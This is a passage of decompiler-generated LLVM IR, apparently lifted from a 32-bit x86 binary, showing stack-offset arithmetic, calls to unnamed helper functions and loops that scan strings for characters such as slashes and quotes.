  %v3_8049da6 = inttoptr i32 %v2_8049da6 to i32*
  store i32 %v0_8049da6, i32* %v3_8049da6, align 4
  %v2_8049da7 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049da7, i32* %eax.global-to-local, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v1_8049dac = add i32 %v0_8049dac, 16
  %v1_8049daf = add i32 %v2_8049da7, -127
  %v6_8049daf = sub i32 126, %v2_8049da7
  %v7_8049daf = and i32 %v6_8049daf, %v2_8049da7
  %v8_8049daf = icmp slt i32 %v7_8049daf, 0
  %v9_8049daf = icmp eq i32 %v1_8049daf, 0
  store i1 %v9_8049daf, i1* %zf.global-to-local, align 1
  %v10_8049daf = icmp slt i32 %v1_8049daf, 0
  %v3_8049db2 = icmp eq i1 %v10_8049daf, %v8_8049daf
  %v4_8049db2 = icmp eq i1 %v9_8049daf, false
  %v5_8049db2 = and i1 %v4_8049db2, %v3_8049db2
  br i1 %v5_8049db2, label %dec_label_pc_80496c3, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049da3
  %v2_8049db8 = add i32 %v0_8049dac, 12
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db8, align 4
  %v2_8049db9 = add i32 %v0_8049dac, 8
  %v3_8049db9 = inttoptr i32 %v2_8049db9 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db9, align 4
  %v0_8049dba = load i32, i32* @edi, align 4
  %v2_8049dba = add i32 %v0_8049dac, 4
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 %v0_8049dba, i32* %v3_8049dba, align 4
  %v1_8049dbb = add i32 %v0_8049dac, 108
  %v2_8049dbb = inttoptr i32 %v1_8049dbb to i32*
  %v3_8049dbb = load i32, i32* %v2_8049dbb, align 4
  store i32 %v3_8049dbb, i32* %edx.global-to-local, align 4
  %v1_8049dbf = add i32 %v3_8049dbb, 16
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  %v3_8049dbf = load i32, i32* %v2_8049dbf, align 4
  %v2_8049dc2 = mul i32 %v3_8049dbf, 128
  %v3_8049dc2 = icmp eq i32 %v2_8049dc2, 0
  store i1 %v3_8049dc2, i1* %zf.global-to-local, align 1
  %v0_8049dc5 = load i32, i32* @ebp, align 4
  %v2_8049dc5 = add i32 %v0_8049dc5, %v2_8049dc2
  store i32 %v2_8049dc5, i32* %eax.global-to-local, align 4
  %v3_8049dc9 = inttoptr i32 %v0_8049dac to i32*
  store i32 %v2_8049dc5, i32* %v3_8049dc9, align 4
  %v3_8049dca = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049dca, i32* %eax.global-to-local, align 4
  %v0_8049dcf = load i32, i32* @esp, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, 108
  %v2_8049dcf = inttoptr i32 %v1_8049dcf to i32*
  %v3_8049dcf = load i32, i32* %v2_8049dcf, align 4
  store i32 %v3_8049dcf, i32* %ecx.global-to-local, align 4
  %v1_8049dd3 = add i32 %v3_8049dcf, 16
  %v2_8049dd3 = inttoptr i32 %v1_8049dd3 to i32*
  %v3_8049dd3 = load i32, i32* %v2_8049dd3, align 4
  %v2_8049dd6 = mul i32 %v3_8049dd3, 128
  %v3_8049dd6 = icmp eq i32 %v2_8049dd6, 0
  store i1 %v3_8049dd6, i1* %zf.global-to-local, align 1
  %v0_8049dd9 = load i32, i32* @ebp, align 4
  %v2_8049dd9 = add i32 %v0_8049dd9, %v2_8049dd6
  store i32 %v2_8049dd9, i32* %ebx.global-to-local, align 4
  %v2_8049ddd = inttoptr i32 %v0_8049dcf to i32*
  store i32 %v2_8049dd9, i32* %v2_8049ddd, align 4
  %v2_8049de0 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049de0, i32* %eax.global-to-local, align 4
  %v0_8049de5 = load i32, i32* @esp, align 4
  %v1_8049de5 = inttoptr i32 %v0_8049de5 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  store i32 %v2_8049de5, i32* %ecx.global-to-local, align 4
  %v3_8049de5 = add i32 %v0_8049de5, 4
  %v0_8049de6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049de6 = add i32 %v0_8049de6, %v2_8049de0
  %v12_8049de6 = icmp eq i32 %v2_8049de6, 0
  store i1 %v12_8049de6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049de6, i32* @ebx, align 4
  %v1_8049de8 = inttoptr i32 %v3_8049de5 to i32*
  store i32 ptrtoint (i32* @global_var_8054b33.19 to i32), i32* %v1_8049de8, align 4
  %v0_8049dee = load i32, i32* @ebx, align 4
  store i32 %v0_8049dee, i32* %v1_8049de5, align 4
  %v3_8049def = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049def, i32* %eax.global-to-local, align 4
  %v0_8049df4 = load i32, i32* @esp, align 4
  %v1_8049df4 = add i32 %v0_8049df4, 56
  %v2_8049df4 = inttoptr i32 %v1_8049df4 to i32*
  %v3_8049df4 = load i32, i32* %v2_8049df4, align 4
  store i32 %v3_8049df4, i32* %ebx.global-to-local, align 4
  %v1_8049df8 = add i32 %v0_8049df4, -4
  %v2_8049df8 = inttoptr i32 %v1_8049df8 to i32*
  store i32 1, i32* %v2_8049df8, align 4
  %v1_8049dfa = add i32 %v0_8049df4, -8
  %v2_8049dfa = inttoptr i32 %v1_8049dfa to i32*
  store i32 ptrtoint (i32* @global_var_8054b3a.16 to i32), i32* %v2_8049dfa, align 4
  %v1_8049dff = add i32 %v0_8049df4, 108
  %v2_8049dff = inttoptr i32 %v1_8049dff to i32*
  %v3_8049dff = load i32, i32* %v2_8049dff, align 4
  store i32 %v3_8049dff, i32* %edx.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e03 = add i32 %v0_8049e03, 3
  store i32 %v1_8049e03, i32* @ebx, align 4
  %v0_8049e06 = load i32, i32* @esi, align 4
  %v2_8049e06 = add i32 %v0_8049e06, %v1_8049e03
  store i32 %v2_8049e06, i32* @esi, align 4
  %v1_8049e08 = add i32 %v3_8049dff, 660
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0e = sub i32 %v3_8049e08, %v1_8049e03
  %v12_8049e0e = icmp eq i32 %v2_8049e0e, 0
  store i1 %v12_8049e0e, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e0e, i32* %eax.global-to-local, align 4
  %v2_8049e10 = add i32 %v0_8049df4, -12
  %v3_8049e10 = inttoptr i32 %v2_8049e10 to i32*
  store i32 %v2_8049e0e, i32* %v3_8049e10, align 4
  %v0_8049e11 = load i32, i32* @esi, align 4
  %v2_8049e11 = add i32 %v0_8049df4, -16
  %v3_8049e11 = inttoptr i32 %v2_8049e11 to i32*
  store i32 %v0_8049e11, i32* %v3_8049e11, align 4
  %v0_8049e12 = call i32 @function_8051d00()
  store i32 %v0_8049e12, i32* %eax.global-to-local, align 4
  %v0_8049e17 = load i32, i32* @esp, align 4
  %v1_8049e17 = add i32 %v0_8049e17, 108
  %v2_8049e17 = inttoptr i32 %v1_8049e17 to i32*
  %v3_8049e17 = load i32, i32* %v2_8049e17, align 4
  store i32 %v3_8049e17, i32* %edx.global-to-local, align 4
  %v0_8049e1b = load i32, i32* @ebx, align 4
  %v2_8049e1b = add i32 %v0_8049e1b, %v3_8049e17
  store i32 %v2_8049e1b, i32* %ebx.global-to-local, align 4
  %v2_8049e1d = add i32 %v0_8049e12, 2115
  %v3_8049e1d = add i32 %v2_8049e1d, %v2_8049e1b
  %v4_8049e1d = inttoptr i32 %v3_8049e1d to i8*
  store i8 0, i8* %v4_8049e1d, align 1
  %v0_8049e25 = load i32, i32* @esp, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 124
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  %v3_8049e25 = load i32, i32* %v2_8049e25, align 4
  store i32 %v3_8049e25, i32* %ecx.global-to-local, align 4
  %v1_8049e2c = add i32 %v3_8049e25, 16
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  %v3_8049e2c = load i32, i32* %v2_8049e2c, align 4
  %v2_8049e2f = mul i32 %v3_8049e2c, 128
  %v3_8049e2f = icmp eq i32 %v2_8049e2f, 0
  store i1 %v3_8049e2f, i1* %zf.global-to-local, align 1
  %v0_8049e32 = load i32, i32* @ebp, align 4
  %v2_8049e32 = add i32 %v0_8049e32, %v2_8049e2f
  store i32 %v2_8049e32, i32* %ebx.global-to-local, align 4
  %v2_8049e36 = add i32 %v0_8049e25, 16
  %v3_8049e36 = inttoptr i32 %v2_8049e36 to i32*
  store i32 %v2_8049e32, i32* %v3_8049e36, align 4
  %v2_8049e37 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049e37, i32* %eax.global-to-local, align 4
  %v0_8049e3c = load i32, i32* @esp, align 4
  %v1_8049e3c = inttoptr i32 %v0_8049e3c to i32*
  %v2_8049e3c = load i32, i32* %v1_8049e3c, align 4
  store i32 %v2_8049e3c, i32* %ecx.global-to-local, align 4
  %v3_8049e3c = add i32 %v0_8049e3c, 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049e3d = add i32 %v0_8049e3d, %v2_8049e37
  %v12_8049e3d = icmp eq i32 %v2_8049e3d, 0
  store i1 %v12_8049e3d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = inttoptr i32 %v3_8049e3c to i32*
  %v2_8049e3f = load i32, i32* %v1_8049e3f, align 4
  store i32 %v2_8049e3f, i32* @edi, align 4
  %v0_8049e40 = load i32, i32* @esi, align 4
  store i32 %v0_8049e40, i32* %v1_8049e3f, align 4
  %v0_8049e41 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e41, i32* %v1_8049e3c, align 4
  %v3_8049e42 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049e42, i32* %eax.global-to-local, align 4
  %v0_8049e47 = load i32, i32* @esp, align 4
  %v1_8049e47 = add i32 %v0_8049e47, 108
  %v2_8049e47 = inttoptr i32 %v1_8049e47 to i32*
  %v3_8049e47 = load i32, i32* %v2_8049e47, align 4
  store i32 %v3_8049e47, i32* %eax.global-to-local, align 4
  %v1_8049e4b = add i32 %v3_8049e47, 16
  %v2_8049e4b = inttoptr i32 %v1_8049e4b to i32*
  %v3_8049e4b = load i32, i32* %v2_8049e4b, align 4
  %v1_8049e51 = add i32 %v3_8049e4b, 1
  %v8_8049e51 = icmp eq i32 %v1_8049e51, 0
  store i1 %v8_8049e51, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e51, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e51, i32* %v2_8049e4b, align 4
  %v0_80496c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80496c3

dec_label_pc_8049e5a:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %eax.global-to-local, align 4
  %v1_8049e5e = add i32 %v3_8049e5a, -1448
  %v2_8049e5e = inttoptr i32 %v1_8049e5e to i8*
  store i8 1, i8* %v2_8049e5e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049a11
  %v1_8049e6a = add i32 %v0_8049a34, 20916
  %v2_8049e6a = inttoptr i32 %v1_8049e6a to i32*
  store i32 7, i32* %v2_8049e6a, align 4
  %v0_8049e75 = load i32, i32* @ebx, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 4
  %v2_8049e75 = inttoptr i32 %v1_8049e75 to i8*
  %v3_8049e75 = load i8, i8* %v2_8049e75, align 1
  %v12_8049e75 = icmp eq i8 %v3_8049e75, 115
  store i1 %v12_8049e75, i1* %zf.global-to-local, align 1
  %v1_8049e79 = icmp eq i1 %v12_8049e75, false
  br i1 %v1_8049e79, label %dec_label_pc_8049e86, label %dec_label_pc_8049e7b

dec_label_pc_8049e7b:                             ; preds = %dec_label_pc_8049e6a
  %v0_8049e7b = load i32, i32* @esp, align 4
  %v1_8049e7b = add i32 %v0_8049e7b, 20900
  %v2_8049e7b = inttoptr i32 %v1_8049e7b to i32*
  store i32 8, i32* %v2_8049e7b, align 4
  br label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e7b
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v1_8049e86 = add i32 %v0_8049e86, 20900
  %v2_8049e86 = inttoptr i32 %v1_8049e86 to i32*
  %v3_8049e86 = load i32, i32* %v2_8049e86, align 4
  store i32 %v3_8049e86, i32* %edx.global-to-local, align 4
  %v2_8049e8d = add i32 %v0_8049e86, -4
  %v3_8049e8d = inttoptr i32 %v2_8049e8d to i32*
  store i32 4, i32* %v3_8049e8d, align 4
  %v0_8049e8e = load i32, i32* @edi, align 4
  %v1_8049e8e = add i32 %v0_8049e8e, 1
  %v1_8049e91 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e91 = sub i32 %v1_8049e8e, %v1_8049e91
  %v12_8049e91 = icmp eq i32 %v2_8049e91, 0
  store i1 %v12_8049e91, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  %v0_8049e93 = load i32, i32* @ebx, align 4
  %v2_8049e93 = add i32 %v0_8049e93, %v1_8049e91
  store i32 %v2_8049e93, i32* %edx.global-to-local, align 4
  %v2_8049e96 = add i32 %v0_8049e86, -8
  %v3_8049e96 = inttoptr i32 %v2_8049e96 to i32*
  store i32 %v2_8049e91, i32* %v3_8049e96, align 4
  %v0_8049e97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e97 = add i32 %v0_8049e86, -12
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e97, i32* %v3_8049e97, align 4
  %v0_8049e98 = load i32, i32* @ebx, align 4
  %v2_8049e98 = add i32 %v0_8049e86, -16
  %v3_8049e98 = inttoptr i32 %v2_8049e98 to i32*
  store i32 %v0_8049e98, i32* %v3_8049e98, align 4
  %v4_8049e99 = call i32 @function_8052753(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e99, i32* %eax.global-to-local, align 4
  %v0_8049e9e = load i32, i32* @esp, align 4
  %v1_8049e9e = add i32 %v0_8049e9e, 20916
  %v2_8049e9e = inttoptr i32 %v1_8049e9e to i32*
  store i32 0, i32* %v2_8049e9e, align 4
  %v0_8049ea9 = load i32, i32* @esp, align 4
  %v6_8049ea9 = icmp eq i32 %v0_8049ea9, -16
  store i1 %v6_8049ea9, i1* %zf.global-to-local, align 1
  %v0_8049eac = load i32, i32* @ebx, align 4
  %v1_8049eac = inttoptr i32 %v0_8049eac to i8*
  %v2_8049eac = load i8, i8* %v1_8049eac, align 1
  %v3_8049eac = zext i8 %v2_8049eac to i32
  %v5_8049eac = and i32 %v4_8049e99, -256
  %v6_8049eac = or i32 %v3_8049eac, %v5_8049eac
  store i32 %v6_8049eac, i32* %eax.global-to-local, align 4
  %v4_8049eae = icmp eq i8 %v2_8049eac, 0
  store i1 %v4_8049eae, i1* %zf.global-to-local, align 1
  br i1 %v4_8049eae, label %dec_label_pc_8049ce8, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e86
  store i32 %v0_8049eac, i32* %ecx.global-to-local, align 4
  %v10_8049eb8 = icmp eq i8 %v2_8049eac, 47
  store i1 %v10_8049eb8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049eb8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb6
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049ed1197 = add i32 %v0_8049eac, 1
  store i32 %v2_8049ed1197, i32* %ecx.global-to-local, align 4
  %v2_8049ed4198 = add i32 %v0_8049ea9, 20916
  %v3_8049ed4199 = inttoptr i32 %v2_8049ed4198 to i32*
  store i32 1, i32* %v3_8049ed4199, align 4
  %v0_8049edb200 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb201 = inttoptr i32 %v0_8049edb200 to i8*
  %v2_8049edb202 = load i8, i8* %v1_8049edb201, align 1
  %v3_8049edb203 = zext i8 %v2_8049edb202 to i32
  %v4_8049edb204 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb205 = and i32 %v4_8049edb204, -256
  %v6_8049edb206 = or i32 %v5_8049edb205, %v3_8049edb203
  store i32 %v6_8049edb206, i32* %edx.global-to-local, align 4
  %v4_8049edd207 = icmp eq i8 %v2_8049edb202, 0
  store i1 %v4_8049edd207, i1* %zf.global-to-local, align 1
  %v1_8049edf208 = icmp eq i1 %v4_8049edd207, false
  br i1 %v1_8049edf208, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ec7:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge
  %v2_8049edb210 = phi i8 [ %v2_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v2_8049edb202, %dec_label_pc_8049ec0 ]
  %v0_8049edb209 = phi i32 [ %v0_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v0_8049edb200, %dec_label_pc_8049ec0 ]
  %v0_8049ec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ec7 = add i32 %v0_8049ec7, 1
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v10_8049ec8 = icmp eq i8 %v2_8049edb210, 47
  store i1 %v10_8049ec8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ec8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge

dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge: ; preds = %dec_label_pc_8049ec7
  %v0_8049ed1.pre = load i32, i32* @ebx, align 4
  %v1_8049ed4.pre = load i32, i32* @esp, align 4
  %v2_8049ed1 = add i32 %v0_8049ed1.pre, %v1_8049ec7
  store i32 %v2_8049ed1, i32* %ecx.global-to-local, align 4
  %v2_8049ed4 = add i32 %v1_8049ed4.pre, 20900
  %v3_8049ed4 = inttoptr i32 %v2_8049ed4 to i32*
  store i32 %v1_8049ec7, i32* %v3_8049ed4, align 4
  %v0_8049edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb = inttoptr i32 %v0_8049edb to i8*
  %v2_8049edb = load i8, i8* %v1_8049edb, align 1
  %v3_8049edb = zext i8 %v2_8049edb to i32
  %v4_8049edb = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb = and i32 %v4_8049edb, -256
  %v6_8049edb = or i32 %v5_8049edb, %v3_8049edb
  store i32 %v6_8049edb, i32* %edx.global-to-local, align 4
  %v4_8049edd = icmp eq i8 %v2_8049edb, 0
  store i1 %v4_8049edd, i1* %zf.global-to-local, align 1
  %v1_8049edf = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049edf, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ee6:                             ; preds = %dec_label_pc_8049930
  %v0_8049ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ee6 = add i32 %v0_8049ee6, 2
  store i32 %v1_8049ee6, i32* %eax.global-to-local, align 4
  %v1_8049ee9 = load i32, i32* @esp, align 4
  %v2_8049ee9 = add i32 %v1_8049ee9, 20900
  %v3_8049ee9 = inttoptr i32 %v2_8049ee9 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ee9, align 4
  %v0_8049951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804994e

dec_label_pc_8049ef5:                             ; preds = %dec_label_pc_80499c3
  %v1_8049ef5 = add i32 %v3_80499c3, 1
  store i32 %v1_8049ef5, i32* %ebx.global-to-local, align 4
  store i32 %v1_8049ef5, i32* %v2_80499c3, align 4
  %v0_8049eff = load i32, i32* @esp, align 4
  %v9_8049eff = icmp eq i32 %v0_8049eff, 12
  store i1 %v9_8049eff, i1* %zf.global-to-local, align 1
  %v0_8049f02 = load i32, i32* @esi, align 4
  %v1_8049f02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049f02 = add i32 %v1_8049f02, %v0_8049f02
  store i32 %v2_8049f02, i32* @ebx, align 4
  %v2_8049f05 = add i32 %v0_8049eff, -16
  %v3_8049f05 = inttoptr i32 %v2_8049f05 to i32*
  store i32 %v2_8049f02, i32* %v3_8049f05, align 4
  %v2_8049f06 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049f06, i32* %eax.global-to-local, align 4
  %v0_8049f0b = load i32, i32* @esp, align 4
  %v1_8049f0b = add i32 %v0_8049f0b, 16
  %v6_8049f0b = icmp eq i32 %v1_8049f0b, 0
  store i1 %v6_8049f0b, i1* %zf.global-to-local, align 1
  %v0_8049f0e = load i32, i32* @ebx, align 4
  %v2_8049f0e = add i32 %v2_8049f06, -1
  %v3_8049f0e = add i32 %v2_8049f0e, %v0_8049f0e
  %v4_8049f0e = inttoptr i32 %v3_8049f0e to i8*
  %v5_8049f0e = load i8, i8* %v4_8049f0e, align 1
  %v14_8049f0e = icmp eq i8 %v5_8049f0e, 34
  store i1 %v14_8049f0e, i1* %zf.global-to-local, align 1
  %v1_8049f13 = icmp eq i1 %v14_8049f0e, false
  br i1 %v1_8049f13, label %dec_label_pc_80499d4, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ef5
  %v1_8049f19 = add i32 %v0_8049f0b, 20916
  %v2_8049f19 = inttoptr i32 %v1_8049f19 to i32*
  %v3_8049f19 = load i32, i32* %v2_8049f19, align 4
  store i32 %v3_8049f19, i32* %eax.global-to-local, align 4
  %v0_8049f20 = load i32, i32* @esi, align 4
  %v2_8049f25 = add i32 %v0_8049f20, %v3_8049f19
  %v12_8049f25 = icmp eq i32 %v2_8049f25, 0
  store i1 %v12_8049f25, i1* %zf.global-to-local, align 1
  store i32 %v2_8049f25, i32* @ebx, align 4
  %v3_8049f27 = inttoptr i32 %v0_8049f0b to i32*
  store i32 %v2_8049f25, i32* %v3_8049f27, align 4
  %v2_8049f28 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049f28, i32* %eax.global-to-local, align 4
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v6_8049f2d = icmp eq i32 %v0_8049f2d, -16
  store i1 %v6_8049f2d, i1* %zf.global-to-local, align 1
  %v0_8049f30 = load i32, i32* @ebx, align 4
  %v2_8049f30 = add i32 %v2_8049f28, -1
  %v3_8049f30 = add i32 %v2_8049f30, %v0_8049f30
  %v4_8049f30 = inttoptr i32 %v3_8049f30 to i8*
  store i8 0, i8* %v4_8049f30, align 1
  %v0_80499d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80499d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_804848a
  %v9_8049f3a = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049f3a, i1* %zf.global-to-local, align 1
  %v1_8049f3d = add i32 %v0_80484a0, -16
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 47, i32* %v2_8049f3d, align 4
  %v2_8049f3f = call i32 @function_8051300(i8 %v1_8049f3f)
  store i32 %v2_8049f3f, i32* %eax.global-to-local, align 4
  %v0_8049f44 = load i32, i32* @esp, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* @ebx, align 4
  %v3_8049f44 = add i32 %v0_8049f44, 4
  %v1_8049f45 = inttoptr i32 %v3_8049f44 to i32*
  store i32 0, i32* %v1_8049f45, align 4
  store i32 47, i32* %v1_8049f44, align 4
  %v3_8049f4a = call i32 @function_8051250(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049f4a, i32* %eax.global-to-local, align 4
  %v0_8049f4f = load i32, i32* @esp, align 4
  %v1_8049f4f = inttoptr i32 %v0_8049f4f to i32*
  %v2_8049f4f = load i32, i32* %v1_8049f4f, align 4
  store i32 %v2_8049f4f, i32* %edx.global-to-local, align 4
  %v3_8049f4f = add i32 %v0_8049f4f, 4
  %v1_8049f50 = inttoptr i32 %v3_8049f4f to i32*
  %v2_8049f50 = load i32, i32* %v1_8049f50, align 4
  store i32 %v2_8049f50, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049f4a, i32* %v1_8049f50, align 4
  %v0_8049f52 = load i32, i32* @esi, align 4
  %v1_8049f52 = add i32 %v0_8049f52, 20
  store i32 %v1_8049f52, i32* %eax.global-to-local, align 4
  store i32 %v1_8049f52, i32* %v1_8049f4f, align 4
  %v3_8049f56 = call i32 @function_8051c70(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f56, i32* %eax.global-to-local, align 4
  %v0_8049f5b = load i32, i32* @esp, align 4
  %v1_8049f5b = inttoptr i32 %v0_8049f5b to i32*
  store i32 47, i32* %v1_8049f5b, align 4
  %v2_8049f62 = call i32 @function_8051280(i8 %v1_8049f3f)
  store i32 %v2_8049f62, i32* %eax.global-to-local, align 4
  %v0_8049f67 = load i32, i32* @esp, align 4
  %v1_8049f67 = add i32 %v0_8049f67, 16
  %v6_8049f67 = icmp eq i32 %v1_8049f67, 0
  store i1 %v6_8049f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_804a062, %dec_label_pc_8049ff8, %dec_label_pc_8049fc3, %dec_label_pc_8049f3a
  %v1_8049f6a = phi i32 [ %v0_80484a0, %dec_label_pc_804848a ], [ %v1_804a08f, %dec_label_pc_804a062 ], [ %v1_804a025, %dec_label_pc_8049ff8 ], [ %v1_8049ff0, %dec_label_pc_8049fc3 ], [ %v1_8049f67, %dec_label_pc_8049f3a ]
  %v0_8049f6a = phi i32 [ %v2_80484ac, %dec_label_pc_804848a ], [ %v2_804a08a, %dec_label_pc_804a062 ], [ %v2_804a020, %dec_label_pc_8049ff8 ], [ %v2_8049feb, %dec_label_pc_8049fc3 ], [ %v2_8049f62, %dec_label_pc_8049f3a ]
  %v2_8049f6a = add i32 %v1_8049f6a, -4
  %v3_8049f6a = inttoptr i32 %v2_8049f6a to i32*
  store i32 %v0_8049f6a, i32* %v3_8049f6a, align 4
  %v0_8049f6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f6b = add i32 %v1_8049f6a, -8
  %v3_8049f6b = inttoptr i32 %v2_8049f6b to i32*
  store i32 %v0_8049f6b, i32* %v3_8049f6b, align 4
  %v1_8049f6c = add i32 %v1_8049f6a, 64
  %v2_8049f6c = inttoptr i32 %v1_8049f6c to i32*
  %v3_8049f6c = load i32, i32* %v2_8049f6c, align 4
  store i32 %v3_8049f6c, i32* %eax.global-to-local, align 4
  %v0_8049f70 = load i32, i32* @ebp, align 4
  %v1_8049f70 = add i32 %v0_8049f70, 1
  store i32 %v1_8049f70, i32* @ebp, align 4
  %v2_8049f71 = add i32 %v1_8049f6a, -12
  %v3_8049f71 = inttoptr i32 %v2_8049f71 to i32*
  store i32 %v3_8049f6c, i32* %v3_8049f71, align 4
  %v0_8049f72 = load i32, i32* @esi, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 3140
  %v9_8049f72 = icmp eq i32 %v1_8049f72, 0
  store i1 %v9_8049f72, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f72, i32* @esi, align 4
  %v1_8049f78 = add i32 %v1_8049f6a, 36
  %v2_8049f78 = inttoptr i32 %v1_8049f78 to i32*
  %v3_8049f78 = load i32, i32* %v2_8049f78, align 4
  store i32 %v3_8049f78, i32* @edi, align 4
  %v2_8049f7c = add i32 %v1_8049f6a, -16
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v3_8049f78, i32* %v3_8049f7c, align 4
  %v3_8049f7d = call i32 @function_8051c70(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f7d, i32* %eax.global-to-local, align 4
  %v0_8049f82 = load i32, i32* @esp, align 4
  %v1_8049f85 = add i32 %v0_8049f82, 128
  %v2_8049f85 = inttoptr i32 %v1_8049f85 to i32*
  %v3_8049f85 = load i32, i32* %v2_8049f85, align 4
  %v4_8049f85 = load i32, i32* @ebp, align 4
  %v15_8049f85 = icmp eq i32 %v3_8049f85, %v4_8049f85
  store i1 %v15_8049f85, i1* %zf.global-to-local, align 1
  %v1_8049f89 = icmp eq i1 %v15_8049f85, false
  br i1 %v1_8049f89, label %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, label %dec_label_pc_8049f8f

dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge: ; preds = %dec_label_pc_8049f6a
  %v0_80483a9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80483a7

dec_label_pc_8049f8f:                             ; preds = %dec_label_pc_8049f6a
  %v1_8049f8f = add i32 %v0_8049f82, 20756
  store i32 %v1_8049f8f, i32* %edx.global-to-local, align 4
  %v1_8049f96 = add i32 %v0_8049f82, 64
  %v2_8049f96 = inttoptr i32 %v1_8049f96 to i32*
  %v3_8049f96 = load i32, i32* %v2_8049f96, align 4
